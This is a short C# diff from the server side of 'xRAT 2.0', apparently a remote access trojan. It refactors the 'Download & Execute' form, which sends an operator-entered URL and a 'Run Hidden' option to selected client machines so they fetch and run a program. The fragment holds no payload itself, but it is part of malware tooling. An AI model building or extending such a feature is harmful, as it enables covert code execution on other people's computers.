@@ -3,36 +3,30 @@ using System.Windows.Forms;
 
 namespace xServer.Forms
 {
-    public partial class frmDownloadAndExecute : Form
+    public partial class FrmDownloadAndExecute : Form
     {
-        private int selectedClients;
+        private readonly int _selectedClients;
 
-        public frmDownloadAndExecute(int selected)
+        public FrmDownloadAndExecute(int selected)
         {
-            selectedClients = selected;
+            _selectedClients = selected;
             InitializeComponent();
         }
 
         private void btnDownloadAndExecute_Click(object sender, EventArgs e)
         {
-            DownloadAndExecute.URL = txtURL.Text;
-            DownloadAndExecute.RunHidden = chkRunHidden.Checked;
+            Core.Misc.DownloadAndExecute.URL = txtURL.Text;
+            Core.Misc.DownloadAndExecute.RunHidden = chkRunHidden.Checked;
 
-            this.DialogResult = System.Windows.Forms.DialogResult.OK;
+            this.DialogResult = DialogResult.OK;
             this.Close();
         }
 
-        private void frmDownloadAndExecute_Load(object sender, EventArgs e)
+        private void FrmDownloadAndExecute_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format("xRAT 2.0 - Download & Execute [Selected: {0}]", selectedClients);
-            txtURL.Text = DownloadAndExecute.URL;
-            chkRunHidden.Checked = DownloadAndExecute.RunHidden;
+            this.Text = string.Format("xRAT 2.0 - Download & Execute [Selected: {0}]", _selectedClients);
+            txtURL.Text = Core.Misc.DownloadAndExecute.URL;
+            chkRunHidden.Checked = Core.Misc.DownloadAndExecute.RunHidden;
         }
-    }
-
-    public class DownloadAndExecute
-    {
-        public static string URL { get; set; }
-        public static bool RunHidden { get; set; }
     }
 }
